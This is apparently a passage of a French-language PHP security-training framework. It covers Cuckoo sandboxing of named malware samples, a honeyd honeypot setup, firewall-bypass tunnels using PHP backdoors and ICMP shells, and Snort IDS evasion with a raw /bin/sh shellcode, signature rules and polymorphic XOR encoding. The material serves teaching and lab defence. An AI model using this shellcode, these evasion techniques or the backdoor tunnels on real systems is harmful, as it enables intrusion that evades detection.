Check inline kernel hooks
Checks for code or binary injection
Check for PLT/GOT hooks
Checks for userland api hooks ");
	    $this->pause();
	    $this->net("http://www.lastline.com/");
	    
	    $this->ssTitre("Sandboxing Online");
	    $this->net("http://totalhash.com/blog/malware-sandbox-programs/");
	    $this->net("http://www.threattracksecurity.com/resources/sandbox-malware-analysis.aspx");
	    $this->net("https://www.raymond.cc/blog/analyze-suspicious-exe-files-with-comodo-instant-malware-analysis/");
	    $this->net("https://malwr.com/about/");
	    $this->net("http://cleanbytes.net/malware-online-scanners");
	    $this->net("http://kromer.pl/malware-analysis/choosing-th-best-sandbox-for-malware-analysis/");
	    $this->ssTitre("Android");
	    $this->net("http://androidsandbox.net/");
	    $this->pause();
	    
	    $this->ssTitre("Sandboxing Types");
	    $this->net("http://sempersecurus.blogspot.com/2011/06/malware-sandbox-services-and-software.html");
	    $this->net("http://zeltser.com/reverse-malware/automated-malware-analysis.html");
	    $this->pause();
	    // cuckoo pour l'install n'est pas fait pour analyser des ELF -> App sous Linux OS -> uniquement des PE -> App pour Windows OS
	    // http://docs.cuckoosandbox.org/en/latest/usage/packages/
	    // ./utils/submit.py --package exe --options arguments=--dosomething /path/to/binary.exe
	    // ./utils/api.py --host 0.0.0.0 --port 1337
	    // $ ./utils/submit.py --package dll --options function=FunctionName /path/to/malware.dll
	    
	    /*
	     * CuckooMX: Automating Email Attachments Scanning with Cuckoo
	     * ./utils/submit.py --package exe MarkoftheNinja.exe
	     * ./utils/submit.py --package zip --options file=setup.exe mon-archive.zip
	     * ./submit.py --download http://www.website.tld/file.exe
	     * ./submit.py /path/to/binary --timeout 60
	     * ./submit.py /path/to/binary --priority 5
	     * python'/opt/cuckoo/utils/submit.py'/home/sandboxuser/samples/virussign.com_8f172d5dedfc25063878cf7ac2a6ed50.vir
	     * Example: submit a local binary and take a full memory dump of the analysis machine:
	     * $ ./utils/submit.py --memory /path/to/binary
	     *
	     * By default it will bind the service on localhost:8090. If you want to change those values, you can for example do this:
	     * ./utils/api.py --host 0.0.0.0 --port 1337
	     *
	     *
	     *
	     * net("http://sourceforge.net/projects/fakenet/");
	     * Cuckoo is capable to analyse different types of packages like:
	     *
	     * applets —> To analyse java Applets
	     * bin —> To analyse generic binary data
	     * cpl —> To analyse Control Panel Applets
	     * dll —> To analyse Dynamically Linked Libraries
	     * doc —> To analyse Ms Word Documents
	     * exe —> Default Package for Windows Executables
	     * generic —> To analyse generic samples via cmd.exe
	     * html —> To analyse Internet Explorer behaviour opening an html file
	     * ie —> To analyze Internet Explorer behaviour opening an url
	     * jar —> To analyse Java JAR
	     * pdf —> To analyse PDF Documents
	     * vbs —> To analyse VBScripts files
	     * xls —> To analyse Ms Excel Documents
	     * zip —> To analyse ZIP Archives
	     *
	     * On Windows:
	     * INetSim: is run to emulate network services and to provide fake responses to the malware.
	     * Capturebat: is run to capture the process, registry and file system activity.
	     * Dependency Walker: is a great tool for viewing file dependencies. Dependency Walker shows four DLLs loaded and the list of api calls imported by the executable (edd94.exe) and it also shows the malware specimen importing an api call “CreateRemoteThread” (Figure 8) which is an api call used by the malware to inject code into another process.
	     * PEiD: is a tool that can be used to detect most common packers, cryptors and compilers for PE files. It can currently detect more than 600 different signatures in the PE files.
	     *
	     *
	     */
	    
	    
	}
	
	
	

	public function poc4malware4sandbox(){
	$this->chapitre("Sandboxing Malware");
	/*
	$this->poc4malware4sandbox_intro();
	$this->img("$this->dir_img/bof/volatility.png");
	*/
	$malware = "$this->dir_tools/Malware/trojan_shylock.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/trojan_spyeye.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/trojan_Poison_ivy_2.3.2.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/trojan_SilentBanker.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/worm_conficker.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/ProRat.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_com_jar.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/trojan_win_c2exe.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_com_ruby.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_win_c2exe.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_com_msf2jar.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_win_msf2ruby.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_com_perl_simple.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_com_msf2php_base64_php2exe4bamcompile.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	$malware = "$this->dir_tools/Malware/backdoor_win_injected_into_app_32_Psexec_no_forked.exe";
	$file2sandbx = new bin4win($malware);
	$file2sandbx->file_file2sandbox("cuckoo1");
	$this->pause();
	
	}
	
	
	// ############################### HONEY POT ###################################
	function poc4malware4detection_honeypot_honeyd() {
	$this->ssTitre(__FUNCTION__);
	$this->net("http://www.malwareblacklist.com/showMDL.php");
	$this->net("https://github.com/Masood-M/YALIH");
	$this->titre("HoneyPot");
		
	$this->article("Honeypot", "Ordinateur ou programme volontairement vulnérable destiné à attirer et à piéger les pirates
But:
– Occuper le pirate
– Découvrir de nouvelles attaques
– Garder le maximum de traces de l’attaque ");
	$this->pause();
	$this->net("https://www.shadowserver.org/wiki/pmwiki.php/Stats/SandboxCharts");
	$this->net("https://www.shadowserver.org/wiki/pmwiki.php/AV/VirusWeeklyStats");
	$this->net("https://www.shadowserver.org/wiki/pmwiki.php/AV/VirusYearlyStats");
	$this->net("https://www.shadowserver.org/wiki/pmwiki.php/AV/CombinedResults");
	$this->pause();
	$this->article("Definition", "Un honeypot(en français pot de miel) est un ordinateur ou un programme volontairement vulnérable mis en place afin d’attirer et piéger les pirates informatiques ou les logiciels malveillants.");
	$this->pause();
	$this->article("le But", " est donc de faire croire à l'intrus, qu’il s’agisse d’une personne physique ou d’un logiciel malveillant, qu'il peut prendre le contrôle d'une véritable machine de production pour observer les moyens de compromission et ainsi donner la possibilité aux administrateurs réseau de l’entreprise de se prémunir contre de nouvelles attaques et leur laisser ainsi un laps de temps supplémentaire afin de réagir avant que les vrais serveur de production soient touchés ");
	$this->pause();
	$this->net("http://www.honeyd.org/");
	$this->pause();
	$this->article($this->ub14041,'ls -l /etc/honeypot/');
	$this->article("if  -rw-r--r-- 1 root root", " * ");
	$this->article($this->ub14041,'sudo chown -R honeyd:honeyd /etc/honeyd');
	$this->article($this->ub14041,'grep honeyd /etc/passwd /etc/group');
	$this->article($this->ub14041,'chmod 755 -R /usr/share/honeyd/scripts/');
	$this->article($this->ub14041,'sudo chown -R honeyd:honeyd /usr/share/honeyd/');
	$this->pause();
	// apt-get install honeyd
		
	/*
	 * /etc/default/honeyd:RUN="yes"
	 * /etc/default/honeyd:INTERFACE="eth1"
	 * /etc/default/honeyd:NETWORK="10.50.10.161 10.50.10.162"
	 * /etc/default/farpd:INTERFACE="eth1"
	 * /etc/default/farpd:NETWORK="10.50.10.161 10.50.10.162"
	 * add windows tcp port 22 \"php -r "echo 'C:\WINDOWS\SYSTEM32>';" \"
	 */
		
	$this->note("si vous ne voulez pas utiliser le daemon alors remplissez les champs suivants");
	$this->article($this->ub14041,'egrep \"RUN=|INTERFACE=|NETWORK=\" /etc/default/honeyd /etc/default/farpd');
	//system($honey);
	$this->pause();
	$this->article($this->ub14041,'echo \"<?php echo \\\"C:\WINDOWS\SYSTEM32>\\\";?>\" > /tmp/cmd.php ');
	$this->pause();
	// chown nobody:nobody /full/path/cmdexe
	$this->requette("grep -i 'windows' /usr/share/nmap/nmap-os-db | sort -u");
	$this->pause();
	$this->requette("grep -i windows /etc/Honeypot/nmap.prints");
	$this->pause();
	$this->requette("grep -A11 \"Microsoft Windows XP Home Edition\" /etc/honeypot/nmap.prints");
	$this->pause();
	$this->requette("grep -A11 \"Apple Mac OS X Server 1.2\" /etc/honeypot/nmap.prints");
	$this->pause();
	//
	$honey_conf = 'create windows
	set windows personality \"Microsoft Windows XP Home Edition\"
set windows default tcp action block
set windows default udp action block
set windows default icmp action open
add windows tcp port 21 \"/usr/share/honeyd/scripts/ftp.sh\"
add windows tcp port 22 \"/usr/share/honeyd/scripts/test.sh \$ipsrc \$dport\"
add windows tcp port 80 \"sh /usr/share/honeyd/scripts/win32/win2k/iis.sh\"
add windows tcp port 8080 \"sh /usr/share/honeyd/scripts/win32/web.sh\"
add windows tcp port 25 \"sh /usr/share/honeyd/scripts/win32/win2k/exchange-smtp.sh\"
add windows tcp port 23 \"php /tmp/cmd.php \"
add windows tcp port 53 open
set windows  uid 65534 gid 65534
bind 10.60.10.162 windows
	
create mac
set mac personality \"Apple Mac OS X Server 10.1.2(ppc)\"
set mac default tcp action block
set mac default udp action block
set mac default icmp action open
add mac tcp port 21 \"sh /usr/share/honeyd/scripts/unix/linux/ftp.sh\"
add mac tcp port 22 \"sh /usr/share/honeyd/scripts/unix/linux/suse8.0/ssh.sh \"
add mac tcp port 23 \"perl /usr/share/honeyd/scripts/unix/general/telnet/faketelnet.pl\"
add mac tcp port 80 open
set mac uid 65534 gid 65534
bind 10.60.10.163 mac';
	// root
	$this->article($this->ub14041,'echo \"$honey_conf\" > /etc/honeypot/rohff_honeyd.conf');
	$this->article($this->ub14041,'ls -l /etc/honeypot/');
	$this->pause();
	$this->article($this->ub14041,'chown honeyd:honeyd /etc/honeypot/rohff_honeyd.conf');
	$this->pause();
	$this->article($this->ub14041,'mkdir /var/log/honeyd && chown -R honeyd:honeyd /var/log/honeyd');
	$this->pause();
	$this->cmd($this->ub14041, "echo '$this->root_passwd' | sudo -S farpd -d -i eth1 10.50.10.162 10.50.10.163");
	$this->pause();
	$this->article($this->ub14041,'sudo ps -aux | grep farpd ');
		
	$this->article("MAC Addres", "Honeyd a besoin d’utiliser l’outil Arpd installé précédemment. Honeyd permet d’associer à ses machines virtuelles des adresses IP qui ne sont pas attribuées dans le réseau. Arpd va répondre aux requêtes ARP en renvoyant l’adresse MAC de la machine hébergeant Honeyd.
		Une fois l’adresse MAC renvoyée, la communication entre Honeyd et l’autre machine pourra démarrer.");
	$this->pause();
	$this->requette("ping -c3 10.60.10.162");
	$this->requette("ping -c3 10.60.10.163");
	$this->requette("ping -c3 $this->ub14041");
	$this->requette("arp -a");
	$this->pause();
	$this->article($this->ub14041,'mkdir /var/log/honeyd && chown -R honeyd:honeyd /var/log/honeyd');
	$this->pause();
	$this->cmd($this->ub14041, " sudo honeyd -d -p /etc/honeypot/nmap.prints -l /var/log/honeyd/honeyd.log -f /home/rohff/Desktop/rohff_honeyd.conf  -i eth1 10.50.10.162 10.50.10.163");
	$this->pause();
	$this->article($this->ub14041,'ps aux | grep honeyd');
	$this->pause();
	$this->cmd($this->ub14041, " watch tail /home/rohff/Desktop/honeyd.log");
	$this->pause();
	$this->requette("ping 10.60.10.162 -c5");
	$this->requette("ping 10.60.10.163 -c5");
	$this->pause();
		
	$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S nmap --send-ip -P0 -p 21,22,23,25,80 -vvv --reason -Pn -n 10.50.10.162-163 ");
	$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 10.60.10.162 --scan 21,22,23,25,80 --syn -I $eth_lan -V");
	$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 10.60.10.163 --scan 21,22,23,25,80 --syn -I $eth_lan -V");
	$this->pause();
	$this->cmd("localhost", "nc 10.60.10.162 21 -v");
	$this->cmd("localhost", "nc 10.60.10.163 22 -v");
	$this->pause();
	$this->cmd("localhost", "ls /usr/share/honeyd/scripts/ -R");
	$this->pause();
	$this->cmd("localhost", "gedit /usr/share/honeyd/scripts/ftp.sh");
	$this->pause();
	$this->cmd("localhost", "gedit $dir_tools/enum/GHHv1.2_PHPShell/phpshell.php");
	$this->pause();
	$this->ssTitre("Simulation de ls");
	$this->cmd("localhost", "gedit $dir_tools/enum/GHHv1.2_PHPShell/ls.txt");
	$this->pause();
	$this->cmd("localhost", "ls /proc > $this->dir_tmp/1.txt && sleep1 && ls /proc > $this->dir_tmp/2.txt && sleep 1 && ls /proc > $this->dir_tmp/3.txt");
	$this->cmd("localhost", "md5sum $this->dir_tmp/1.txt $this->dir_tmp/2.txt $this->dir_tmp/3.txt");
	$this->pause();
	$this->cmd("localhost", "cmp 1.txt 2.txt && cmp 2.txt 3.txt && cmp 1.txt 3.txt");
	$this->pause();
	$this->cmd("localhost", "diff 1.txt 2.txt && diff 2.txt 3.txt && diff 1.txt 3.txt");
	$this->pause();
	$this->note("(ls /proc) -> /proc/ ça change tout le temps sur un vrai system mais sur un honeypot ça ne change pas");
	$this->pause();
	$this->net("http://map.honeynet.org/");
	$this->net("http://dionaea.carnivore.it/");
	$this->net("http://carnivore.it/2009/11/06/dionaea_sql_logging");
	$this->pause();
	$this->ssTitre("Other Honeypot Project");
	$this->net("http://sourceforge.net/projects/nepenthes/");
	$this->net("http://sourceforge.net/projects/honeydrive/?source=directory");
	$this->net("http://ghh.sourceforge.net/");
	$this->pause();
	}
	// ###############################################################################################
		
	




	public function poc4malware4bypass4fw(){
	// netfilter
	// reverse connection
	/*
	$this->ssTitre("fwlogwatch");
	$this->net("http://packetstormsecurity.com/files/download/94600/fwlogwatch-1.2.tar.gz");
*/

	
	
	// ###################### HTTP TUNNEL ##########################################
	$this->chapitre("Tunneling");
	$this->titre("HTTP TUNNEL");

	$this->img("$this->dir_img/mitm/tunnel-HTTP.png");
	/*
	$tunnel_http = new tunnel4linux("ub14041", $this->ub14041, 8080, $this->prof, 5555,"$this->dir_tmp/http-tunnel/tunnel.py", "",$this->msf,4444);
	$tunnel_http->tunnel_http2tcp4tunneld(); // 
	$this->pause();
	
	//$tunnel_http = new tunnel4linux("ub14041", $this->ub14041, 8881, $this->prof, 8880,"/opt/httptunnel-3.0.5/htc", "",$this->msf,4444);
	//$tunnel_http->tunnel_http2tcp4hts(); // 
	//$this->pause();

	
	
	$tunnel_icmp2icmp = new tunnel4linux("ub14041", $this->ub14041, 0, $this->prof, 0,"/etc/passwd", "",$this->msf,4444);
	$tunnel_icmp2icmp->tunnel_icmp4file(); // OK
	$this->pause();
	*/
	$tunnel_type = new tunnel4linux("ub14041", $this->ub14041, 8, $this->prof, 0,"$this->dir_tmp/ISHELL-v0.2/ish", "",$this->msf,4444);
	$tunnel_type->tunnel_icmp2type(); // OK
	$this->pause();
  
	$tunnel_tcp = new tunnel4linux("ub14041", $this->ub14041, 4444, $this->prof, 8880,"$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp->tunnel_icmp2tcp();  // OK 
	$this->pause();
			
	
	$tunnel_tcp2tcp4covert = new tunnel4linux("ub14041", $this->ub14041, 6677, $this->prof, 8880,"$this->dir_tmp/covert_tcp.elf", "",$this->msf,4444);
	$tunnel_tcp2tcp4covert->tunnel_tcp2tcp4covert(); // OK 
	$this->pause();
		
	/*
	$tunnel_tcp2tcp4time = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4time->tunnel_tcp2tcp4time(); // Not Yet
	$this->pause();
	
	$tunnel_tcp2tcp4dns = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4dns->tunnel_tcp2tcp4dns(); // Not Yet
	$this->pause();
	
	$tunnel_tcp2tcp4ssh = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4ssh->tunnel_tcp2tcp4ssh();
	$this->pause();
	
	$tunnel_tcp2tcp4msn = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4msn->tunnel_tcp2tcp4msn();  // Not Yet
	$this->pause();
	
	$tunnel_tcp2udp = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2udp->tunnel_tcp2udp(); // Not Yet
	$this->pause();
	
	$tunnel_udp = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_udp->tunnel_udp(); // Not Yet
	$this->pause();
	
	$tunnel_tcp2tcp4rtp = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4rtp->tunnel_tcp2tcp4rtp(); // Not Yet
	$this->pause();
	
	$tunnel_tcp2tcp4sip = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4sip->tunnel_tcp2tcp4sip();// Not Yet
	$this->pause();
	
	$tunnel_tcp2tcp4voip = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_tcp2tcp4voip->tunnel_tcp2tcp4voip();// Not Yet
	$this->pause();
	
	$tunnel_arp = new tunnel4linux("ub14041",$this->ub14041, "5353", $this->prof, "5353","$this->dir_tmp/backdoor_php.php", "",$this->msf,4444);
	$tunnel_arp->tunnel_arp();// Not Yet
	$this->pause();
*/
	}
	
	public function poc4malware4bypass4nids(){
	
	
	// Application protocol-based intrusion detection system (APIDS)
	// Protocol-based intrusion detection system (PIDS)
	
	
	// ###################### NIDS ##########################################
	$this->ssTitre("Fonctionnement");
	$this->article("NIDS", "La plupart des systèmes de détection d'intrusion identifie les attaques au moyen d'une analyse de signature.
Cette analyse de signature signifie en réalité que le système de détection d'intrusion est programmé pour interpréter certaines séries de paquets de
données ou bien certaines parties de données contenues dans ces paquets comme une attaque.");
	$this->article("Deroulement du Network IDS", "Un sonde placée dans le réseau
– Surveille l’ensemble du réseau
– Capture et analyse tout le trafic
– Recherche de paquets suspects
• Contenu des données
• Adresses IP ou MAC source ou destination
• ...
– Envoi d’alertes");
	$this->pause();
	
	$this->article("Réactions de Snort", "Les alertes émises par snort peuvent être de différentes nature. Par exemple, on peut spécifier à snort de rediriger l'intégralité des alarmes sur la sortie standard et ainsi observer l'évolution des attaques. Cependant, ceci nécessite une présence attentive devant un écran, ce qui peut parraîter rebutant.
Snort ne permet pas d'envoyer de mail directement, étant donné son rôle premier de sniffer qui est gourmand en ressource. L'envoi de mail d'alerte ralentirait snort d'une telle manière que beaucoup de paquets seraient \"droppés\" (éjectés). Qu'à cela ne tienne, Snort a été conçu pour interagir facilement avec le deamon syslogd afin que ce dernier génère les futurs logs qui peuvent être instantannément parsés par d'autres applications telles que \"logsurfer\" ou encore \"swatch\" respectivement :
http://www.obfuscation.org/emf/logsurfer/snort.txt http://www.theadamsfamily.net/~erek/snort/snort-swatch.conf.txt.
Ces derniers permettent d'envoyer un mail avec les logs attachés en pièces jointes, et donc aussi des sms, si l'entreprise dispose d'un tel serveur.
Snort est aussi capable d'adopter des comportements visant à interdire l'accès à certaines adresses IP, dans le cas où ces dernières auraient tenté de pénétrer le réseau. L'IDS peut alors interagir avec le firewall afin qu'il mette à jour ses règles d'accès pour empêcher tout contact avec l'éventuel pirate.
Il faut cependant ce méfier de cette possibilité puisqu'en cas de mauvaise configuration, elle peut facilement entrainer la coupure totale du réseau. Il convient alors d'utiliser une solution robuste, telle que \"snortsam\" (www.snortsam.net). ");
	$this->pause();
	$this->article("Méthodes de détection : Par Signature", "
Par signature:
– Basé sur la reconnaissances de schémas déjà connus
– Utilisation d’expressions régulières
– Les signatures d’attaques connues sont stockées dans une base; et chaque événement est comparé au contenu de cette base
• Si correspondance l’alerte est levée
– L’attaque doit être connue pour être détectée
– Peu de faux-positifs
	
Méthode la plus simple, basé sur :
– Si EVENEMENT matche SIGNATURE Alors ALERTE
Facile à implémenter pour tout type d’IDS
L’efficacité des ids est liée à la gestion de leur base de signatures
– MAJ
– Nombre de règles
– Signatures suffisamment précises
	
Avantage
– Simplicité de mise en œuvre
– Rapidité de diagnostic
– Précision (en fonction des régles)
– Identification du procédé d’attaque
• Procédé
• Cibles
• Sources
• Outils
		");
	$this->article("Inconvénients","– Ne détecte que les attaques connues
– Maintenance de la base
– Techniques d’évasion possibles dès lors que les signatures sont connues");
	
	$this->article("Méthodes de détection : Par anomalie", "Basée sur le comportement « normal » du système
Une déviation par rapport à ce comportement est considérée suspecte Le comportement doit être modélisé : on définit alors un profil
Une attaque peut être détectée sans être préalablement connue -> Détecter une intrusion consiste a détecter un écart ");
	
	$this->ssTitre("SIEM (Security Information and Event Management)");
	$this->article("SIEM", "Security Information and Event Management (SIEM) solutions are a combination of the formerly disparate product categories of SIM (security information
management) and SEM (security event manager). SIEM technology provides real-time analysis of security alerts generated by network hardware and applications.");
	$this->net("https://en.wikipedia.org/wiki/Siem");
	
	$this->pause();
	// #############################################################################
	
	
	// ######################  NIPS ##########################################
	
	$this->article("Après la Détection", "Comprendre l’attaque en cours
	– Recueillir le maximum d’information
	• Cibles
	• Sources
	• Procédé
	Archiver, tracer : Corrélation avec d’autre événements
	Préparer une réponse(Prévention) :
– Sur le court terme : black-listage
– Sur le long terme : application de patches, action en justice...	");
	$this->net("http://fr.wikipedia.org/wiki/Syst%C3%A8me_de_pr%C3%A9vention_d%27intrusion");
	$this->pause();
	$this->article("IDS vers IPS", "
– Terme à la base plutôt marketing
– Techniquement :
	• Un IPS est un IDS qui ajoute des fonctionnalités de blocage pour une anomalie trouvée
	• IDS devient actif => IPS
	
	IPS Objectifs :
– Interrompre une connexion
– Ralentir la connexion
– Blacklister les sources
Moyens :
– Règle Firewall
– QoS
– Intervention applicatif (Proxy)
	
Avantages
– Attaque bloquée immédiatement
Inconvénients
– Les faux-positifs
– Peut paralyser le réseau ");
	$this->pause();
	
	// #############################################################################
	
	
	// ######################    ##########################################
	// #############################################################################
	
	
	// ######################    ##########################################
	// #############################################################################
	
	
	
	$this->lts = "xp";
	$this->eth_lan = "eth0";
	
	
	 // %u encoding IDS bypass vulnerability ou vulnérabilité par codage %u pour contourner les systèmes de détection d'intrusion.
	 
	
	$this->titre("Shellcode Polymorphe");
	$this->article("Les shellcodes polymorphiques", " sont une sorte d'évolution des shellcodes, ils
peuvent prendre un nombre illimité de formes tout en gardant les mêmes actions. \nCela fait augmenter légèrement la taille de votre shellcode mais cette techniques permet de passer au travers de beaucoup de sécurités, notemment les IDS.");
	$this->ssTitre("1. Les instructions dérivées");
	$this->gras("La première forme du polymorphisme est de réécrire une instruction en plusieurs différentes, par exemple :\n
	\tmov $0, %eax\n
	\t\tpeut devenir :\n
	\txorl %eax, %eax\n
Cette forme de polymorphisme à une infinité de possibilités, et est relativement efficace.\n");
	$this->pause();
	$this->ssTitre("Exemple d'identification par signature");
	$this->gras("souvent les IDS regardent si la chaine /bin/sh est présente. Là, une simple réécriture des instructions ne suffira pas.\n");
	$this->gras("Les payloads peuvent être détectés de nombreuses manières, étant donné leur structure commune :
 Une suite de plusieurs dizaines(voire centaines) d’octets NOPs
 La présence de syscall(64 bit) et donc de l’interruption 0x80(32 bit): l’instruction « int 0x80 » correspond aux opcodes 0xCD80
 La présence d’une chaîne de caractères suspecte pouvant être utilisée avec execve() par exemple, comme « /bin/sh »
 La répétition en fin de chaîne de l’adresse de retour, de la forme 0xbfffxxxx
Si l’on jette un œil aux fichiers /etc/snort/rules/shellcode.rules et /etc/snort/rules/exploit.rules, on constate que la base de données de signatures sur les shellcodes de Snort n’est pas très exhaustive.
Toutefois certaines peuvent être gênantes si l’on veut rester « stealth ».
La réponse à ce souci se trouve dans le polymorphisme des shellcodes, qui va nous permettre de bypasser ces règles assez facilement.\n");
	$this->pause();
	$this->requette("gedit /etc/snort/rules/shellcode.rules /etc/snort/rules/exploit.rules /etc/snort/rules/emerging-exploit.rules");
	$this->ssTitre("0x1 Presence des NOPs");
	$this->requette("grep '90 90' /etc/snort/rules/shellcode.rules /etc/snort/rules/emerging-exploit.rules /etc/snort/rules/exploit.rules ");
	$this->pause();
	$this->ssTitre("0x2 Presence de l'instruction int 0x80 -> CD 80 ");
	$this->requette("grep 'CD 80' /etc/snort/rules/shellcode.rules /etc/snort/rules/emerging-exploit.rules /etc/snort/rules/exploit.rules");
	$this->pause();
	$this->ssTitre("0x3 Presence de la chaine /bin/sh ");
	$this->requette("grep '/bin/sh' /etc/snort/rules/shellcode.rules /etc/snort/rules/emerging-exploit.rules /etc/snort/rules/exploit.rules");
	$this->requette("grep '/shh//bi' /etc/snort/rules/shellcode.rules /etc/snort/rules/emerging-exploit.rules /etc/snort/rules/exploit.rules");
	$this->pause();
	
	$this->requette("echo 'sh' | hexdump -C");
	$this->requette("echo 'alert tcp any any -> any 5555 (msg:\"$this->user_local  SHELLCODE NOPS\"; content:\"|90 90 90 90 90 90 90 90 90 90|\";  sid:1000001;)
alert tcp any any -> any 5555 (msg:\"$this->user_local  SHELLCODE BIN\"; content:\"bin\"; sid:1000002;)
alert tcp any any -> any 5555 (msg:\"$this->user_local  SHELLCODE SH\"; content:\"|73 68|\"; sid:1000004;)' > $this->dir_tmp/$this->user_local"."_shellcode.rules");
	$this->pause();
	$this->requette("gedit $this->dir_tmp/$this->user_local"."_shellcode.rules");
	$this->pause();
	$this->ssTitre("Test Snort IDS");
	$this->requette("echo -e \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\" > $this->dir_tmp/test.raw ");
	$cmd1 = "echo '$this->root_passwd' | sudo -S snort -c $this->dir_tmp/$this->user_local"."_shellcode.rules -A console -i lo ";
	$cmd2 = "nc localhost 5555 -v < $this->dir_tmp/test.raw";
	$this->exec_parallel($cmd1, $cmd2, 5 );
	$this->pause();
	$this->ssTitre("Fonctionnement");
	$this->article("Polymorphisme", "Le mot polymorphisme vient du grec et signifie plusieurs formes. Ce terme a été employé en informatique pour la première fois par un pirate bulgare portant le pseudonyme Dark Avenger, ce dernier ayant créé en 1992 le premier virus polymorphique.
L'objectif du code polymorphique est d'éviter la détection tout en s'adaptant aux modèles, c'est-à-dire à certains traits caractéristiques permettant d'identifier un code donné.
La technique de détection des modèles est utilisée dans les logiciels antivirus et dans les systèmes de détection des intrusions.
L'encodage est un mécanisme le plus souvent utilisé pour intégrer le polymorphisme dans le code des logiciels informatiques. Le code approprié, exécutant les fonctions principales du logiciel est encodé et une fonction de plus est ajoutée au logiciel, dont la seule tâche est d'encoder et de lancer le code original.");
	$this->pause();
	$this->gras("Il est beaucoup plus difficile aux systèmes IDS de noter la présence de code polymorphique que celle du shellcode typique, mais il ne faut pas oublier que le polymorphisme ne résout pas tous les problèmes. \n
La plupart des systèmes contemporains de détection d'intrusions utilisent, outre les signatures, des techniques plus ou moins avancées permettant de détecter également le shellcode encodé.\n");
	$this->pause();
	$this->article("Décodeur", "La tâche du décodeur est de décoder le shellcode. Il existe divers moyens permettant d'y parvenir mais quatre méthodes utilisant les instructions assembleur de base sont utilisées le plus souvent");
	$this->article("la soustraction(l'instruction sub)", " les valeurs numériques données sont soustraites des octets du shellcode encodé.");
	$this->article("l'ajout(instruction add)", " les valeurs numériques données sont ajoutées aux octets donnés du shellcode");
	$this->article("la différence symétrique(l'instruction xor)", "  les octets donnés du shellcode sont soumis à l'opération de différence symétrique avec une valeur définie");
	$this->article("le déplacement(l'instruction mov)", "  les octets donnés du shellcode sont échangés les uns contre les autres\n");
	$this->titre("Exemple");
	
	$this->titre("Encodage avec Metasploit");
	$this->ssTitre("msfvenom architecture 32bits ");
	$this->requette("msfvenom -l encoders -a x86");
	$this->pause();
	

	
	$this->gras("Les règles de Snort couvrent de très nombreux domaines ; en effet on en trouve pour détecter les flux sortants de Peer to Peer, de messageries instantanées et de backdoors mais également afin de donner l’alerte en cas de flux entrants suspects, comme par exemple une suite d’octets ‘\x90’(NOP) qui est souvent synonyme de shellcode.
Les étapes pour coder un tel shellcode sont donc les suivantes :
- Coder le shellcode de base
- Le crypter par XOR avec une clé de 8 bits incrémentée à chaque itération, en vérifiant qu’aucun octet ne soit NULL dans le shellcode encodé
